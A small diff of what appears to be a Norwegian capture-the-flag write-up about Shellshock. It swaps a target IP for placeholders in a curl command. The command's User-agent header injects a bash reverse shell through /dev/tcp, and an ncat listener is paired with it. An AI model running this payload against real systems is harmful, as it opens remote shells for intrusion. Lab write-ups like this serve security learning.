@@ -48,7 +48,7 @@ Dette betyr vi kan injecte commands til maskinen og vi gjør da et reverse shell
 ```
 ncat -lvnp 1234
 
-curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.56/1234 0>&1" http://localhost/cgi-bin/hello.sh
+curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/1234 0>&1" http://localhost/cgi-bin/hello.sh
 ```
 
 Og vi har shell!
